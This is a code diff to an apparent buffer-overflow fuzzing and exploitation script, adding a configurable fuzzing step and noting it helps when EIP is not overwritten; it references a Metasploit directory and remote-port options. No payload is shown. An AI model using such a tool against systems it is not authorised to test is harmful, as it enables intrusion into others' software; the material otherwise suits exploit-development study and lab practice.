@@ -40,7 +40,7 @@ def fuzz(start: int = 100, end: int = 10000) -> int:
             print("[+] Fuzzing with %s bytes" % len(fuzz_str))
             send_data(prefix + fuzz_str.encode() + suffix)
             time.sleep(1)
-            start += 100
+            start += step
     except ConnectionRefusedError:
         print("[-] Connection refused")
     except socket.timeout:
@@ -285,10 +285,11 @@ if __name__ == "__main__":
     parser.add_argument("--msf", help = "metasploit framework directory to use", default = "/usr/share/metasploit-framework")
     parser.add_argument("--noreceive", help = "use if the program doesn't send an initial response on connect", default = False, action="store_true")
     parser.add_argument("--newline", help = "add newline character to the end of the sent data", default = False, action ="store_true")
+    parser.add_argument("--step", help = "step increment for fuzzing, default 100, try increasing if EIP is not overwritten", default = 100)
 
     args = parser.parse_args()
 
-    global ip, port, timeout, prefix, suffix, rport, interface, msf, noreceive, newline, offset
+    global ip, port, timeout, prefix, suffix, rport, interface, msf, noreceive, newline, offset, step
     ip: str = args.ip
     port: int = int(args.port)
     rport: int = int(args.rport)
@@ -300,6 +301,7 @@ if __name__ == "__main__":
     noreceive: bool = args.noreceive
     newline: bool = args.newline
     offset: int = int(args.offset)
+    step: int = int(args.step)
 
     if newline:
         suffix += b"\n"
